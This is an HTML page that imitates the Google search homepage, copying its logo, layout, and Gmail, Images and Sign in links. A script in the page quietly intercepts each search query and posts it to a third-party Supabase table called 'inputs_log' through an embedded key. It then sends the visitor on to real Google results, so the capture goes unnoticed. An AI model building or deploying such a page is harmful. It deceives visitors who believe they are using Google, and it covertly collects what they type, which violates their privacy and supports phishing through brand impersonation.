<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Search</title>

<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
font-family:Arial,Helvetica,sans-serif;
background:#fff;
color:#202124;
display:flex;
flex-direction:column;
min-height:100vh;
}
.top-bar{
display:flex;
justify-content:flex-end;
align-items:center;
padding:14px 20px;
gap:18px;
font-size:13px;
}
.top-bar a{text-decoration:none;color:#1f1f1f}
.signin-btn{
background:#1a73e8;
color:white!important;
padding:9px 23px;
border-radius:4px;
}
.main-content{
flex:1;
display:flex;
flex-direction:column;
align-items:center;
justify-content:center;
padding:0 16px;
}
.logo img{
width:272px;
height:auto;
}
.search-container{max-width:584px;width:100%}
.search-box{
display:flex;
align-items:center;
border:1px solid #dfe1e5;
border-radius:24px;
padding:8px 16px;
background:white;
}
.search-input{
flex:1;
border:none;
outline:none;
font-size:16px;
}
.search-buttons{
display:flex;
justify-content:center;
gap:12px;
margin-top:28px;
}
.search-buttons button{
background:#f8f9fa;
border:1px solid #f8f9fa;
border-radius:4px;
padding:8px 18px;
cursor:pointer;
}
</style>
</head>

<body>

<div class="top-bar">
<a href="#">Gmail</a>
<a href="#">Images</a>
<a href="#" class="signin-btn">Sign in</a>
</div>

<div class="main-content">
<div class="logo">
<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" 
alt="Google Logo">
</div>

<div class="search-container">
<form id="searchForm">
<div class="search-box">
<input type="text" id="searchInput" class="search-input"
placeholder="Search Google or type a URL" required>
</div>

<div class="search-buttons">
<button type="submit" value="search">Google Search</button>
<button type="submit" value="lucky">I'm Feeling Lucky</button>
</div>
</form>
</div>
</div>

<script>
(function(){

const SUPABASE_URL = "https://hzxnnmvjbkjrdmekhfnx.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_vgluzY2BHvStHfE1JEJIVw_uLhHli2Z";
const TABLE_NAME = "inputs_log";

async function logAndRedirect(queryText, action){

const url = `${SUPABASE_URL}/rest/v1/${TABLE_NAME}`;

try {
await fetch(url,{
method:"POST",
headers:{
"apikey":SUPABASE_ANON_KEY,
"Authorization":`Bearer ${SUPABASE_ANON_KEY}`,
"Content-Type":"application/json",
"Prefer":"return=minimal"
},
body: JSON.stringify({
query: queryText
})
});
} catch (error) {
console.error("Logging failed:", error);
}

const encoded = encodeURIComponent(queryText);
const destination = action==="lucky"
? `https://www.google.com/search?q=${encoded}&btnI`
: `https://www.google.com/search?q=${encoded}`;

window.location.href = destination;
}

const form = document.getElementById("searchForm");
const input = document.getElementById("searchInput");

form.addEventListener("submit", function(e){
e.preventDefault();

const query = input.value.trim();
if(!query) return;

const action = e.submitter ? e.submitter.value : "search";

logAndRedirect(query, action);
});

})();
</script>

</body>
</html>
